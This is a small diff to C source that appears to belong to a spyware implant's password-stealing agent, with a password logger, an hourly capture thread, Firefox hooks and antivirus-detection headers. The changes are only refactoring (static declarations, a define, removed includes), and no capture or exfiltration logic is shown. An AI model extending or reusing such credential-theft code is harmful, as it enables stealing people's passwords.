@@ -1,13 +1,13 @@
 #define _CRT_SECURE_NO_WARNINGS 1
 
+#define PM_PSTOREAGENT        0xFAFA
+
 #include <Windows.h>
 #include <json/JSON.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
 #include "../../H4DLL/bss.h"
 #include "../../H4DLL/AM_Core.h"
-#include "../../H4DLL/HM_IpcModule.h"
-#include "../../H4DLL/HM_InbundleHook.h"
 #include "../../H4DLL/LOG.h"
 #include "../../H4DLL/bin_string.h"
 #include "../../H4DLL/av_detect.h"
@@ -27,13 +27,13 @@ extern void FireFoxInitFunc(void);
 extern void FireFoxUnInitFunc(void);
 
 //globals
-HANDLE hfpwd;
+static HANDLE hfpwd;
 #define PASSWORD_SLEEP_TIME (1000*60*60) //millisecondi  (ogni ora)
 
 // Globals
 BOOL g_bPasswordForceExit = FALSE;	// Semaforo per l'uscita del thread (e da tutti i clicli nelle funzioni chiamate)
 BOOL bPM_PasswordStarted = FALSE;	// Indica se l'agente e' attivo o meno
-HANDLE hPasswordThread = NULL;		// Thread di cattura
+static HANDLE hPasswordThread = NULL;		// Thread di cattura
 
 int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass)
 {
@@ -158,13 +158,12 @@ DWORD __stdcall PM_PStoreAgentStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-
-DWORD __stdcall PM_PStoreAgentInit(JSONObject elem)
+static DWORD WINAPI PM_PStoreAgentInit(JSONObject elem)
 {
 	return 1;
 }
 
-DWORD __stdcall PM_PStoreAgentUnregister()
+static DWORD WINAPI PM_PStoreAgentUnregister()
 {
 	FireFoxUnInitFunc();
 	return 1;
